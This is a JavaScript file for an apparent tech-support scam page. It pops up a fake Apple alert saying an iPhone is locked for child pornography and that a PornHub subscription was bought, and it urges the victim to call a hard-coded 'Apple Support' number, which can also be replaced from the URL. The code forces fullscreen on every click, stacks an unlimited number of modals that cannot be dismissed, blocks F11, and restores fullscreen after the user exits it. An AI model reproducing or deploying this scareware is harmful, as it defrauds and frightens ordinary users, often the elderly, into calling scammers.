let modalCount = 0;
const maxModals = Infinity;
let fullScreenTriggered = false;

// Function to trigger full screen
function triggerFullScreen() {
  const elem = document.documentElement;
  if (!document.fullscreenElement) {
    // Only trigger if not already in fullscreen
    if (elem.requestFullscreen) {
      elem.requestFullscreen().catch((err) => {
        console.error("Fullscreen error:", err);
      });

    } else if (elem.webkitRequestFullscreen) {
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
      elem.msRequestFullscreen();
    }
  }
}

// Function to exit fullscreen
function exitFullScreen() {
  if (document.exitFullscreen) {
    document.exitFullscreen();
  } else if (document.webkitExitFullscreen) {
    document.webkitExitFullscreen();
  } else if (document.msExitFullscreen) {
    document.msExitFullscreen();
  }
}

// Function to generate random position within viewport
function getRandomPosition(modalWidth, modalHeight) {
  const viewportWidth = Math.max(
    document.documentElement.clientWidth || 0,
    window.innerWidth || 0,
  );
  const viewportHeight = Math.max(
    document.documentElement.clientHeight || 0,
    window.innerHeight || 0,
  );

  if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
    return {
      top: Math.max(0, (viewportHeight - modalHeight) / 2),
      left: Math.max(0, (viewportWidth - modalWidth) / 2),
    };
  }

  const maxX = viewportWidth - modalWidth;
  const maxY = viewportHeight - modalHeight;

  const randomX = Math.floor(Math.random() * (maxX + 1));
  const randomY = Math.floor(Math.random() * (maxY + 1));

  return { top: randomY, left: randomX };
}

function getFormattedPhone() {
  const rawPhone = new URLSearchParams(window.location.search).get("p");

  let phoneNumber = "+1-888-413-2130";

  if (rawPhone) {
    const clean = rawPhone.replace(/\D/g, "");

    phoneNumber = clean.startsWith("1") ? `+${clean}` : `+1-${clean}`;
  }

  return phoneNumber;
}

function updatePhoneNumbers(container = document) {
  const phoneNumber = getFormattedPhone();

  if (!phoneNumber) return;

  container.querySelectorAll('a[href^="tel:"]').forEach((link) => {
    link.href = `tel:${phoneNumber}`;

    const text = link.textContent.trim();

    if (text.startsWith("Call")) {
      link.textContent = `Call ${phoneNumber}`;
    } else if (/^\+?[\d\s\-()]+$/.test(text)) {
      link.textContent = phoneNumber;
    }
  });
}

// Function to create a new modal with random position
    function createNewModal() {

const phoneNumber = getFormattedPhone();
    
        if (modalCount >= maxModals) return null;

        modalCount++;

        const newModal = document.createElement('div');
        newModal.className = 'modal fade modal-stack';
        newModal.id = `appleAlertModal-${modalCount}`;
        newModal.tabIndex = -1;
        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
        newModal.setAttribute('aria-hidden', 'true');

	        newModal.innerHTML = `
	            <div class="modal-dialog modal-lg positioned">
	                <div class="modal-content" id="applealertmodeltwo">
                        <button class="demo-modal-close" type="button" aria-label="Close dialog" data-bs-dismiss="modal">
                            <i class="bi bi-x-lg"></i>
                        </button>
	                    <div class="modal-body text-center">
                            <div class="demo-modal-icon">
                                <i class="bi bi-bell-fill"></i>
                            </div>
	                        <div class="alert-text">
	                            
                                 <p> Your iPhone has been locked due to illegal child pornography activity on your device. Your
                        purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple
                        Support <span class="dynamic-phone">${phoneNumber}</span> to unlock it!</p>
	                        </div>

	                        
	                        <div class="text-end gap-4 mt-3 actionbtn">
                                <a href="tel:${phoneNumber}" class="me-2 bg-primary">
                                    <i class="bi bi-telephone-fill"></i>
                                    Call ${phoneNumber}
                                </a>
                                
	                        </div>
	                    </div>
	                </div>
	            </div>
	        `;
	
	        const modalHost = document.getElementById('modalContainer') || document.body;
	        modalHost.appendChild(newModal);
	        updatePhoneNumbers(newModal);

        const modal = new bootstrap.Modal(newModal, {
            backdrop: 'static',
            keyboard: false
        });

        const modalDialog = newModal.querySelector('.modal-dialog');
        let modalWidth, modalHeight;

        modalWidth = Math.min(600, window.innerWidth * 0.9);
        modalHeight = window.innerWidth <= 576 ? 250 : 400;

        const { top, left } = getRandomPosition(modalWidth, modalHeight);
        modalDialog.style.top = `${top}px`;
        modalDialog.style.left = `${left}px`;

        if (window.innerWidth <= 576) {
            modalDialog.style.width = `${modalWidth}px`;
            modalDialog.style.maxWidth = 'none';
        }

        newModal.style.zIndex = 1080 + modalCount;
        modal.show();

        // Ensure tel: link actually triggers phone call
        newModal.querySelectorAll('.tel-link').forEach(link => {
            link.addEventListener('click', (e) => {
                window.location.href = link.getAttribute('href');
            });
        });

        // return modal;
    }

// Initialize the first modal
const appleAlertModal = new bootstrap.Modal(
  document.getElementById("appleAlertModal"),
  {
    backdrop: "static",
    keyboard: false,
  },
);

document.addEventListener("DOMContentLoaded", function () {
  appleAlertModal.show();
});

// Add event listener to body for fullscreen and modal creation
document.body.addEventListener("click", () => {
  triggerFullScreen();
  createNewModal();
});

// On ESC â†’ exit fullscreen
document.addEventListener(
  "keydown",
  function (e) {
    if (e.key === "Escape") {
      exitFullScreen();
    }
    if (e.key === "F11" || e.keyCode === 122) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  },
  true,
);

document.addEventListener(
  "keyup",
  function (e) {
    if (e.key === "F11" || e.keyCode === 122) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  },
  true,
);

// If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    // User exited fullscreen
    document.body.addEventListener("click", triggerFullScreen, { once: true });
  }
});

window.addEventListener("resize", function () {
  const modals = document.querySelectorAll(
    ".modal-stack .modal-dialog.positioned",
  );

  modals.forEach((modal) => {
    const viewportHeight = window.innerHeight;
    const modalHeight = modal.offsetHeight;
    let { top } = getRandomPosition(modal.offsetWidth, modalHeight);

    if (top + modalHeight > viewportHeight) {
      top = Math.max(0, viewportHeight - modalHeight);
    }

    modal.style.top = `${top}px`;
    modal.style.left = `0`;
    modal.style.width = `100%`;
    modal.style.maxHeight = `${viewportHeight}px`;
    modal.style.overflow = `hidden`;
  });
});
